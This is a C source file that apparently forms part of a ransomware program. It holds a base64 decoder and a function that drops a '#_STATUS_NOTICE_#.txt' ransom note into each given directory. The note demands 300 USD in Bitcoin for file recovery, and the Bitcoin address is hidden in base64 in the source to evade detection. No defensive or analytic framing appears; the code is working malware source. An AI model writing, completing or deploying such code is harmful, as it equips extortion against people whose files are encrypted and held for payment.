#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <stddef.h>

/*
 * Base64 decode a null-terminated string.
 * Returns 0 on success, -1 on failure (invalid input, buffer too small).
 * Writes decoded bytes into 'out' (up to 'out_size' bytes).
 * Does NOT null‑terminate the output; caller must handle that.
 */
static int
base64_decode(const char *in, unsigned char *out, size_t out_size)
{
    size_t in_len = strlen(in);
    if (in_len % 4 != 0)
        return -1;          // base64 input must be multiple of 4

    size_t out_pos = 0;
    for (size_t i = 0; i < in_len; i += 4) {
        int v[4];
        for (int j = 0; j < 4; ++j) {
            char c = in[i + j];
            if (c >= 'A' && c <= 'Z')
                v[j] = c - 'A';
            else if (c >= 'a' && c <= 'z')
                v[j] = c - 'a' + 26;
            else if (c >= '0' && c <= '9')
                v[j] = c - '0' + 52;
            else if (c == '+')
                v[j] = 62;
            else if (c == '/')
                v[j] = 63;
            else if (c == '=')
                v[j] = -2;          // padding marker
            else
                return -1;          // invalid character
        }

        int padding = 0;
        if (v[2] == -2) {
            padding = 2;            // "=="
            if (v[3] != -2)
                return -1;
        } else if (v[3] == -2) {
            padding = 1;            // "="
        }

        if (padding == 0) {
            if (out_pos + 3 > out_size)
                return -1;
            out[out_pos++] = (v[0] << 2) | (v[1] >> 4);
            out[out_pos++] = (v[1] << 4) | (v[2] >> 2);
            out[out_pos++] = (v[2] << 6) | v[3];
        } else if (padding == 2) {
            if (out_pos + 1 > out_size)
                return -1;
            out[out_pos++] = (v[0] << 2) | (v[1] >> 4);
        } else { /* padding == 1 */
            if (out_pos + 2 > out_size)
                return -1;
            out[out_pos++] = (v[0] << 2) | (v[1] >> 4);
            out[out_pos++] = (v[1] << 4) | (v[2] >> 2);
        }
    }
    return 0;
}

/*
 * Write a '#_STATUS_NOTICE_#.txt' file into each directory listed in 'directories'.
 * The file contains instructions and the Bitcoin address, which is stored
 * base64‑encoded in the source and decoded at runtime.
 */
void
write_manifest_notice(const char *directories[], size_t count)
{
    /* Base64‑encoded Bitcoin address (exact literal) */
    const char *b64_addr =
        "MUExelAxZVA1URdlZmkyRE1QVGZUTDVTTG12N0RpdmZOYQ==";

    /* Decode the address once */
    unsigned char decoded_addr[64];               /* 34 bytes + room */
    if (base64_decode(b64_addr, decoded_addr, sizeof(decoded_addr)) != 0) {
        fprintf(stderr, "Error: failed to decode Bitcoin address\n");
        return;
    }

    /* Compute the actual decoded length (null‑terminate for string use) */
    size_t b64_len = strlen(b64_addr);
    size_t effective = b64_len;
    while (effective > 0 && b64_addr[effective - 1] == '=')
        --effective;
    size_t addr_len = (effective / 4) * 3;
    decoded_addr[addr_len] = '\0';
    const char *addr = (const char *)decoded_addr;

    /* Build the notice content once */
    const char *prefix =
        "To recover your files, send 300 USD to the following Bitcoin address:\n";
    const char *suffix =
        "\nAfter payment, initiate contact via secure channel to receive decryption instructions.\n";

    size_t content_len = strlen(prefix) + addr_len + strlen(suffix) + 1;
    char *content = malloc(content_len);
    if (!content) {
        perror("malloc");
        return;
    }
    snprintf(content, content_len, "%s%s%s", prefix, addr, suffix);

    /* Write notice into each directory */
    for (size_t i = 0; i < count; ++i) {
        const char *dir = directories[i];
        if (!dir)
            continue;

        char path[PATH_MAX];
        int ret = snprintf(path, sizeof(path), "%s/%s",
                           dir, "#_STATUS_NOTICE_#.txt");
        if (ret < 0 || (size_t)ret >= sizeof(path)) {
            fprintf(stderr, "Error: path too long for directory '%s'\n", dir);
            continue;
        }

        FILE *f = fopen(path, "w");
        if (!f) {
            fprintf(stderr, "Error: cannot create '%s': %s\n",
                    path, strerror(errno));
            continue;
        }

        if (fputs(content, f) == EOF) {
            fprintf(stderr, "Error: writing to '%s': %s\n",
                    path, strerror(errno));
        }
        fclose(f);
    }

    free(content);
}